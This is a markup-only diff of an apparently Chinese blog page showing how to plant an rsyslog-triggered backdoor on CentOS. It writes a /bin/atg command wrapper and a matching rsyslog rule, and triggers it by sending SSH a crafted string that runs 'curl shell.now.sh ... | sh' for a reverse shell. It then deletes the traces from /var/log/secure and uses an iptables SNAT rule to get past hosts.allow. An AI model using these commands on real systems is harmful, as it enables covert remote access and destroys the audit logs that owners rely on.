@@ -39,7 +39,7 @@
       
       <p>Centos自带rsyslog，网上有具体利用过程，这里我记录下简单的坑。</p>
 <h3>建立</h3>
-<div class="highlight"><pre><span></span><span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;#!/bin/sh\nsh -c &quot;$1&quot;&#39;</span><span class="o">&gt;/</span><span class="n">bin</span><span class="o">/</span><span class="n">atg</span>
+<div class="highlight"><pre><span></span><code><span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;#!/bin/sh\nsh -c &quot;$1&quot;&#39;</span><span class="o">&gt;/</span><span class="n">bin</span><span class="o">/</span><span class="n">atg</span>
 <span class="n">chmod</span> <span class="mi">755</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">atg</span>
 
 <span class="n">echo</span> <span class="ss">&quot;auth.*,regex, abcd  ^/bin/atg&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">rsyslog</span><span class="p">.</span><span class="n">d</span><span class="o">/</span><span class="n">README</span><span class="p">.</span><span class="n">conf</span>
@@ -47,34 +47,34 @@
 <span class="err">重启生效</span><span class="p">(</span><span class="n">Centos用下面的systemctl</span><span class="p">):</span>
 <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">init</span><span class="p">.</span><span class="n">d</span><span class="o">/</span><span class="n">rsyslog</span> <span class="k">restart</span>
 <span class="n">systemctl</span> <span class="k">restart</span> <span class="n">rsyslog</span>
-</pre></div>
+</code></pre></div>
 
 
 <h3>利用:</h3>
-<div class="highlight"><pre><span></span><span class="nt">echo</span> <span class="s2">&quot;xxxxx&#39;;curl https://shell.now.sh/127.0.0.1:1337 | sh;&#39;&quot;</span><span class="o">|</span><span class="nt">socat</span> <span class="nt">STDIO</span> <span class="nt">TCP4</span><span class="p">:</span><span class="nd">127</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">1</span><span class="p">:</span><span class="nd">22</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">echo &quot;xxxxx&#39;;curl https://shell.now.sh/127.0.0.1:1337 | sh;&#39;&quot;|socat STDIO TCP4:127.0.0.1:22</span>
+</code></pre></div>
 
 
 <h3>擦屁股:</h3>
-<div class="highlight"><pre><span></span><span class="n">sed</span> <span class="o">-</span><span class="n">i</span> <span class="s1">&#39;/xxxxx/d&#39;</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">secure</span>
-<span class="n">kill</span> <span class="o">-</span><span class="mi">9</span> <span class="err">$$</span> 
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">sed -i &#39;/xxxxx/d&#39; /var/log/secure</span>
+<span class="err">kill -9 $$ </span>
+</code></pre></div>
 
 
 <h3>注意事项</h3>
 <p>如果主机设定了<code>hosts.allow</code>的情况下，利用的那一部分是无法成功的，因为这个ssh的日志不会被记录。所以咧我们可以利用iptables. :)</p>
-<div class="highlight"><pre><span></span><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">nat</span> <span class="o">-</span><span class="n">A</span> <span class="k">INPUT</span> <span class="o">-</span><span class="n">p</span> <span class="n">tcp</span> <span class="o">-</span><span class="n">d</span> <span class="o">&lt;</span><span class="err">受害主机</span><span class="o">&gt;</span> <span class="c1">--dport 22 -s &lt;攻击主机&gt; -j SNAT --to-source &lt;ip白名单的地址&gt;</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">iptables -t nat -A INPUT -p tcp -d &lt;受害主机&gt; --dport 22 -s &lt;攻击主机&gt; -j SNAT --to-source &lt;ip白名单的地址&gt;</span>
+</code></pre></div>
 
 
 <p>然后呢，iptables得开机启动，并且加载这个规则:</p>
-<div class="highlight"><pre><span></span><span class="n">systemctl</span> <span class="n">disable</span> <span class="n">firewalld</span>  <span class="o">//</span><span class="err">在</span><span class="n">centos7</span> <span class="err">上面防火墙改成这个了</span>
-<span class="n">yum</span> <span class="n">install</span> <span class="n">iptables</span><span class="o">-</span><span class="n">services</span>   <span class="o">//</span> <span class="err">以防万一</span>
-<span class="n">systemctl</span> <span class="n">enable</span> <span class="n">iptables</span>
-<span class="n">systemctl</span> <span class="k">start</span> <span class="n">iptables</span>    <span class="o">//</span><span class="err">启动</span>
-<span class="n">systemctl</span> <span class="n">status</span> <span class="n">iptables</span>  <span class="o">//</span><span class="err">查看状态</span>
-<span class="n">service</span> <span class="n">iptables</span> <span class="n">save</span>   <span class="o">//</span><span class="err">设定好规则之后，重启也会生效。</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">systemctl disable firewalld  //在centos7 上面防火墙改成这个了</span>
+<span class="err">yum install iptables-services   // 以防万一</span>
+<span class="err">systemctl enable iptables</span>
+<span class="err">systemctl start iptables    //启动</span>
+<span class="err">systemctl status iptables  //查看状态</span>
+<span class="err">service iptables save   //设定好规则之后，重启也会生效。</span>
+</code></pre></div>
 
 
 <ul>
